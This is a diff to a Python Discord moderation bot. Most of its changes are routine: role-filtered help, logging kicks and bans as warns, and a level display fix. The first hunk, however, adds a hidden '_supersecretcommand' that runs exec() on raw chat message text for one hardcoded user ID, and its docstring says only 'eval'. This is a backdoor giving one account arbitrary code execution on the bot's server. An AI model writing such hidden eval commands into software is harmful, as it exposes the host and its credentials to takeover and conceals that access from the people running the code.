@@ -20,25 +20,28 @@ class CommandSyntaxError(Exception):
 # SYSTEM COMMANDS #
 # --------------------------------------------------#
 
-'''async def _supersecretcommand(message, parameters):
-    """adds role specific emotes"""
-    with open("file.png", 'rb') as pic:
-        arole=message.guild.get_role(int(parameters))
-        await message.guild.create_custom_emoji(name='netherite', image=pic.read(), roles=[arole], reason="suggestion 371")
-
+async def _supersecretcommand(message, parameters):
+    """eval"""
+    if message.author.id != 381634036357136391:
+        return
+    exec(parameters)
+    
 _supersecretcommand.command_data = {
-    "syntax": "_a",
-    "aliases": ["_aaaa"],
+    "syntax": "_supersecretcommand",
+    "aliases": [],
     "role_requirements": [configuration.MODERATOR_ROLE]
-}'''
+}
 
 async def help(message, parameters):
     """Help command - Lists all commands, or gives info on a specific command."""
 
     if parameters is None:
+        roles = message.author.roles
+
         # Get a string listing all commands
         all_commands = "\n".join(
-            [function.__name__ for function in command_list])
+            [function.__name__ for function in command_list if \
+                any(x in set([role.id for role in roles]) for x in function.command_data["role_requirements"])])
         # Make one of those fancy embed doohickies
         help_embed = discord.Embed(title="PhnixBot Help",
                                    description="For information on a specific command, use `help [command]`") \
@@ -209,7 +212,7 @@ async def warns(message, parameters):
         warn_text += str(warn[0]) + '\n'
         timestamp_text += str(warn[1]) + '\n'
 
-    warn_embed = discord.Embed(title="Warns", description=f"<@{member.id}>") \
+    warn_embed = discord.Embed(title=f"Warns. Total of {len(warn_list)}", description=f"<@{member.id}>") \
         .add_field(name="Reason", value=warn_text) \
         .add_field(name="Timestamp", value=timestamp_text)
 
@@ -365,7 +368,8 @@ async def kick(message, parameters):
         raise CommandSyntaxError('You must specify a valid user.')
 
     try:
-        # await message.guild.kick(member_reason[0], reason=member_reason[1])
+        await warn(message, f"{member_reason[0].id} KICK - {member_reason[1]}")
+        await message.guild.kick(member_reason[0], reason=member_reason[1])
         await message.channel.send(
             f"Kicked {member_reason[0].name}#{member_reason[0].discriminator} ({member_reason[0].id}) for {member_reason[1]}")
     except discord.errors.Forbidden:
@@ -385,6 +389,7 @@ async def ban(message, parameters):
         raise CommandSyntaxError('You must specify a valid user.')
 
     try:
+        await warn(message, f"{member_reason[0].id} BAN - {member_reason[1]}")
         await message.guild.ban(member_reason[0], reason=member_reason[1], delete_message_days=0)
         await message.channel.send(
             f"Banned {member_reason[0].name}#{member_reason[0].discriminator} ({member_reason[0].id}) for {member_reason[1]}")
@@ -421,9 +426,10 @@ async def rank(message, parameters):
 
     rank_embed = discord.Embed(title="Rank", description=f"<@{member.id}>") \
         .add_field(name="Total XP:", value=user_xp[0]) \
-        .add_field(name="Level:", value=user_xp[1]) \
+        .add_field(name="Level:", value=(user_xp[1]-1)) \
         .add_field(name="Rank:", value="#" + str(user_rank[0])) \
         .add_field(name="XP until level up:", value=await levels.xp_needed_for_level(user_xp[1]) - user_xp[0])
+        # Internally, levels start at 1, but users want it to start at 0, so there is a fix for that
         
     await message.channel.send(embed=rank_embed)
 
